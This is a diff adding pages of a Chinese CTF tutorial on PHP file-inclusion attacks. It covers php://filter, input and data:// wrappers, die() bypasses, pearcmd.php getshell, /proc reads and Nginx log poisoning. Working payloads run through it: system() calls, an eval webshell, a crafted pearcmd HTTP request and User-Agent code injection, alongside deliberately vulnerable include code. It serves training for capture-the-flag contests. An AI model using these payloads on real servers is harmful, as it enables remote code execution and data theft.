+<td style="text-align: left;">该参数可选。可以设定一个或多个过滤器名称，以管道符（<code>|</code>）分隔。</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>write=&lt;写链的筛选列表&gt;</code></td>
+<td style="text-align: left;">该参数可选。可以设定一个或多个过滤器名称，以管道符（<code>|</code>）分隔。</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>&lt;；两个链的筛选列表&gt;</code></td>
+<td style="text-align: left;">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>可用的过滤器列表</strong></li>
+</ul>
+<p>在 CTF 竞赛中常用的为 <code>转换过滤器</code>，在一些极端情况下可以通过 <code>字符串过滤器</code> 实现 bypass，当然这里需要大家了解一下 <a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP 支持的字符编码</a>，另外其他的过滤器类型详见：<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string.rot13</td>
+<td>等同于<code>str_rot13()</code>，rot13变换</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>convert.base64-encode &amp; convert.base64-decode</td>
+<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
+</tr>
+<tr>
+<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>用法</strong>：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x"># 直接读，PHP 代码会被解析</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="x">php://filter/resource=flag.php</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="x"># 针对 PHP 文件（常用）</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="x">php://filter/read=convert.base64-encode/resource=flag.php</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="x"># 其他字符编码</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="x">php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="x"># Rot13</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="x">php://filter/string.rot13/resource=1.php</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="x"># </span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="x">php://input</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="x">[POST DATA部分]</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+<ul>
+<li><strong>示例</strong></li>
+</ul>
+<p><strong>convert</strong></p>
+<p></p><div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$x</span><span class="p">){</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class="p">,</span><span class="nv">$x</span><span class="p">)){</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>        <span class="k">die</span><span class="p">(</span><span class="s1">'too young too simple sometimes naive!'</span><span class="p">);</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    <span class="p">}</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="p">}</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="nv">$contents</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'contents'</span><span class="p">];</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">"&lt;?php die();?&gt;"</span><span class="o">.</span><span class="nv">$contents</span><span class="p">);</span>
+</code></pre></div>
+  把 Base64 和 Rot13 过滤了，根据 <a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP 支持的字符编码</a>，发现 PHP 支持的字符编码还是挺多的，我们这里随便选择一个进行使用
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>GET: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.php
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>POST: contents=?&lt;hp pystsme"(ac tlf"*;)
+</code></pre></div>
+<p>关于代码生成，注意 <code>ucs-2</code> 编码的字符串位数一定要是偶数，否则会报错，<code>ucs-4</code> 编码的字符串位数一定要是 4 的倍数，否则会报错</p>
+<p></p><div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cp">&lt;?php</span> 
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="k">echo</span> <span class="nb">iconv</span><span class="p">(</span><span class="s2">"UCS-2LE"</span><span class="p">,</span><span class="s2">"UCS-2BE"</span><span class="p">,</span><span class="s1">'&lt;?php system("cat fl*");'</span><span class="p">);</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1">// ?&lt;hp pystsme"(ac tlf"*;)</span>
+</code></pre></div>
+  <strong>base64</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="x"># index.php</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>  <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>  <span class="k">require</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]);</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<hr>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="x"># flag.php</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="c1">// $flag = 'flag{th14_1s_m3_fl4g}';</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="k">echo</span> <span class="s1">'答案在注释里，自己找吧'</span><span class="p">;</span>
+</code></pre></div>
+<p>我们可以利用 <code>php://filter</code> 伪协议来读取文件内容，需要注意的是，<code>php://filter</code> 伪协议如果不指定过滤器的话，默认会解析 PHP 代码，所以我们需要指定 <code>convert.base64-encode</code> 过滤器来对文件内容进行编码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">php://filter/read=convert.base64-encode/resource=flag.php</span>
+</code></pre></div>
+<p><strong>rot13</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>    <span class="nv">$file </span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    <span class="nv">$content </span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'content'</span><span class="p">];</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>    <span class="nv">$file </span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"php"</span><span class="p">,</span> <span class="s2">"???"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>    <span class="nv">$file </span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"data"</span><span class="p">,</span> <span class="s2">"???"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>    <span class="nv">$file </span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="s2">"???"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>    <span class="nv">$file </span><span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="s2">"???"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="s2">"&lt;?php die('大佬别秀了');?&gt;"</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>    
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>    <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="p">}</span>
+</code></pre></div>
+<p>一个写文件的题，但是有过滤，不允许包含 <code>php</code> , <code>data</code> , <code>:</code> 和 <code>.</code> 但是在写入操作的时候，会把 <code>file</code> 参数进行 <code>urldecode</code>，所以我们可以两次 <code>urldecode</code> 来绕过过滤，然后只需要考虑如何绕过 <code>&lt;?php die('大佬别秀了');?&gt;</code> 中的 <code>die()</code> 即可</p>
+<p>我们可以尝试使用 Base64 绕过 <code>die()</code>，Base64 的编码范围是 <code>0-9</code> , <code>a-z</code> , <code>A-Z</code> , <code>+</code> 和 <code>/</code> ，其他字符会被忽略，去掉不支持的字符，只剩下了 <code>phpdie</code> 了，因为 Base64 解码是按照 4位 一组进行解码的，所以我们需要在最终编码出来的字符串中最前面添加两个字母，以达到 Base64 解码的规则</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">// 需要两次URL编码</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="x">GET: ?file=php://filter/convert.base64-decode/resource=1.php</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="x">// 需要base64编码，编码后最前面添加两个字母如：aa</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="x">POST: content=</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat f*'</span><span class="p">);</span>
+</code></pre></div>
+<p>另一种方法是使用 Rot13 编码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x">// 需要两次URL编码</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="x">GET: ?file=php://filter/string.rot13/resource=1.php</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="x">// 需要Rot13编码</span>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="x">POST: content=</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat f*'</span><span class="p">);</span>
+</code></pre></div>
+<p>Rot13 解码后写入的文件内容变为了</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">&lt;?</span><span class="nx">cuc qvr</span><span class="p">(</span><span class="s1">'大佬别秀了'</span><span class="p">);</span><span class="cp">?&gt;&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat f*'</span><span class="p">);</span>
+</code></pre></div>
+<p>这样就可以绕过 <code>die()</code> 了</p>
+<p><strong>input</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="x"># 注意使用 php://input 的时候必须开启 allow_url_include</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>  <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>  <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">]);</span>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p><img alt="img" src="../assets/include/image10.jpeg"></p>
+<p>当我们有写入操作的时候，可以直接写入一句话木马</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="cp">&lt;?php</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'muma.php'</span><span class="p">,</span> <span class="s1">'&lt;?php @eval($_POST[cmd]);'</span><span class="p">);</span>
+</code></pre></div>
+<h3 id="data">data://<a class="headerlink" href="#data" title="Permanent link">¶</a></h3>
+<ul>
+<li>
+<p><strong>条件</strong>：</p>
+</li>
+<li>
+<p>allow_url_fopen：on</p>
+</li>
+<li>
+<p>allow_url_include： on</p>
+</li>
+<li>
+<p><strong>作用</strong>：自 <code>PHP&gt;=5.2.0</code> 起，可以使用 <code>data://</code> 数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+</li>
+<li>
+<p><strong>用法</strong>：</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="x">data://text/plain,</span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nx">data</span><span class="o">://</span><span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">;</span><span class="nx">base64</span><span class="p">,[</span><span class="nx">Base64编码后的代码</span><span class="p">]</span>
+</code></pre></div>
+<ul>
+<li><strong>示例</strong>：</li>
+</ul>
+<p>```php
+  # 注意使用 data:// 的时候必须开启 allow_url_include 和 allow_url_fopen
+  <!--?php
+    highlight_file(__FILE__);
+    include($_GET['filename']);
+  ?-->
+</p>
+<p>推荐使用 <code>base64</code> 编码进行参数的传递</p>
+<p><img alt="img" src="../assets/include/image12.jpeg"></p>
+<h2 id="bypass">bypass<a class="headerlink" href="#bypass" title="Permanent link">¶</a></h2>
+<h3 id="pearcmd">pearcmd<a class="headerlink" href="#pearcmd" title="Permanent link">¶</a></h3>
+<p>在<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">Docker PHP裸文件本地包含综述</a>中，提到了 <code>pearcmd.php</code> 的利用方法。该方法无需竞争条件，也没有额外的版本限制，只要是Docker启动的PHP环境即可通过一个数据包搞定。</p>
+<blockquote>
+<p>在Docker的任何版本镜像中，<code>pcel/pear</code>都会被默认安装，安装路径在<code>/usr/local/lib/php</code></p>
+</blockquote>
+<p>通过发送以下数据包，目标将写入一个文件 <code>/tmp/hello.php</code>，其中包含 <code>&lt;?=phpinfo()?&gt;</code>。然后，利用文件包含漏洞包含这个文件即可实现getshell。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nf">GET</span> <span class="nn">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">192.168.1.162:8080</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+<h3 id="peclcmd">peclcmd<a class="headerlink" href="#peclcmd" title="Permanent link">¶</a></h3>
+<p>与 <code>peclcmd</code> 相似，参考 <a href="https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2023/readonly/README.md">SEETF-2023</a> 中的一道题目。</p>
+<h3 id="proc">proc<a class="headerlink" href="#proc" title="Permanent link">¶</a></h3>
+<p>在文件包含漏洞的情境中，通常会存在非预期的情况，例如 <a href="https://5ime.cn/hmgb-2023.html#Dreamer-revenge">Dreamer_revenge</a>（红明谷杯 2023）、<a href="https://jbnrz.com.cn/index.php/2023/09/03/ycb2023/#header-id-13">ArkNights</a>（羊城杯 2023）、<a href="https://ph0ebus.cn/post/HDCTF2023%20Writeup.html#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3">YamiYami</a>（HDCTF 2023）、<a href="https://www.cnblogs.com/gxngxngxn/p/17662463.html">MyBox</a>（NSSCTF 2<sup>nd</sup>）。因此，如果出题人未清空变量，很有可能通过 <code>/proc</code> 实现非预期攻击。</p>
+<p><code>/proc</code> 是一个在 Linux 系统中用于访问内核内部数据结构、获取系统信息以及控制系统行为的虚拟文件系统。它提供了一种通过文件系统的方式查看和操作内核状态的机制。值得注意的是，<code>/proc</code> 是一个伪文件系统，其数据只存在于内存中，而不占用硬盘空间。</p>
+<p>以下是一些常用的 <code>/proc</code> 目录下文件和目录：</p>
+<ol>
+<li><code>/proc/self</code>：表示当前进程的目录。通过 <code>/proc/self</code> 可以方便地获取当前进程的信息。</li>
+<li><code>/proc/$pid/</code>：表示进程号为 <code>$pid</code> 的进程目录。例如，<code>/proc/1234/</code> 对应进程号为 1234 的进程（Docker容器默认的PID为1）</li>
+</ol>
+<p>一些常用的 <code>/proc</code> 文件和目录：</p>
+<ul>
+<li><code>/proc/self/cmdline</code>：包含当前进程的完整命令行参数。</li>
+<li><code>/proc/self/cwd</code>：是一个符号链接，指向当前进程的当前工作目录。</li>
+<li><code>/proc/self/exe</code>：是一个符号链接，指向当前进程的可执行文件。</li>
+<li><code>/proc/self/environ</code>：包含当前进程的环境变量。</li>
+<li><code>/proc/self/fd/</code>：是一个目录，包含当前进程打开的文件描述符的符号链接列表。</li>
+</ul>
+<p>通过读取这些文件，可以获取关于进程的详细信息，方便进行调试和监控。在给定上下文中，对于 Docker 容器，<code>/proc</code> 中的信息可以用于发现容器内部的运行时信息，如进程启动命令、环境变量等。</p>
+<h2 id="_10">实战<a class="headerlink" href="#_10" title="Permanent link">¶</a></h2>
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-1.md -->
+<h3 id="input">input<a class="headerlink" href="#input" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b1797cd0e0a243d4ffc351.jpg"></p>
+<p>打开页面给出了源代码</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b1798ad0e0a243d4ffc355.jpg"></p>
+<p><code>extract()</code> 函数从数组中将变量导入到当前的符号表，该函数使用数组键名作为变量名，使用数组键值作为变量值</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b179a1d0e0a243d4ffc359.jpg"></p>
+<p><code>empty()</code> 函数判断是否为空，空为 <code>False</code></p>
+<p><code>trim()</code> 函数移除字符串两侧的空白字符或其他预定义字符</p>
+<p><code>file_get_contents()</code> 把整个文件读入一个字符串中</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b179bcd0e0a243d4ffc35c.jpg"></p>
+<p>由此可以看出这里存在一个文件包含漏洞，我们可以结合 PHP 伪协议</p>
+<p><code>php://input</code> 在 POST 请求中访问其中的 <code>data</code> 部分，我们可以 GET 传入 <code>ac</code> 值，fn 为伪协议，最后 POST 传入 <code>ac</code> 值使条件成立</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17a0cd0e0a243d4ffc363.jpg"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-2.md -->
+<h3 id="filter">filter<a class="headerlink" href="#filter" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17a79d0e0a243d4ffc36e.jpg"></p>
+<p>打开网页有个链接</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17a89d0e0a243d4ffc376.jpg"></p>
+<p>点击进去发现 URL 路径变成了 file 参数</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17aa7d0e0a243d4ffc37a.jpg"></p>
+<p>使用 PHP 伪协议读取源码</p>
+<p>php://filter 用于读取源代码并输出，convert.base64-encode 进行 Base64 编码输出，resource 指定读取文件</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17ac9d0e0a243d4ffc37f.jpg"></p>
+<p>解码拿到 flag</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17aead0e0a243d4ffc381.jpg"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-3.md -->
+<h3 id="nginx-rce">Nginx 日志 RCE<a class="headerlink" href="#nginx-rce" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68393d1c58cb8da5c81c5769.png"></p>
+<p>打开网页给出了源码</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68393d3d58cb8da5c81c587a.png"></p>
+<p>文件包含是没有任何过滤的，但是没有 <code>/flag</code> 文件</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68393d5558cb8da5c81c5980.png"></p>
+<p>分析架构为 Nginx 服务器</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68393dd058cb8da5c81c5d82.png"></p>
+<p>尝试访问日志文件 <code>/var/log/nginx/error.log</code> 和 <code>/var/log/nginx/access.log</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68393ec158cb8da5c81c625b.png"></p>
+<p>发现 <code>access.log</code> 被设置为了 UA 头</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68393eda58cb8da5c81c62c7.png"></p>
+<p>于是我们可以改 UA 头为 PHP 代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>User-Agent: &lt;?php echo system('ls');?&gt;
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6839434158cb8da5c81c7a54.png"></p>
+<p>再查看 <code>flag.php</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>User-Agent: &lt;?php system('cat flag.php');?&gt;
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6839447e58cb8da5c81c7fc8.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-4.md -->
+<h3 id="data-rce">data 伪协议 RCE<a class="headerlink" href="#data-rce" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6808c71f58cb8da5c8c67481.png"></p>
+<p>打开网页给出了源代码</p>
+<p><code>strstr()</code> 用于查找字符串首次出现的位置（区分大小写）</p>
+<p><code>str_replace()</code> 以其他字符替换字符串中的一些字符（区分大小写）</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'hello'</span><span class="p">];</span>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="nv">$page</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="k">while</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="s2">"php://"</span><span class="p">))</span> <span class="p">{</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>    <span class="nv">$page</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"php://"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$page</span><span class="p">);</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="p">}</span>
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="k">include</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="cp">?&gt;</span>
+</code></pre></div>
+<p>虽然禁用了 <code>php://</code> 伪协议，但是 <code>data://</code> 还可以使用</p>
+<p>如果传入的数据是 PHP 代码，就会执行代码，用法如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="x">data://text/plain;base64,xxxx(base64 编码后的数据)</span>
+</code></pre></div>
+<p>或者</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="x">data://text/plain,xxx(数据)</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6808cbee58cb8da5c8c681d5.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter7\7-5.md -->
+<h3 id="data-rce_1">data 伪协议 RCE 绕过双斜杠<a class="headerlink" href="#data-rce_1" title="Permanent link">¶</a></h3>
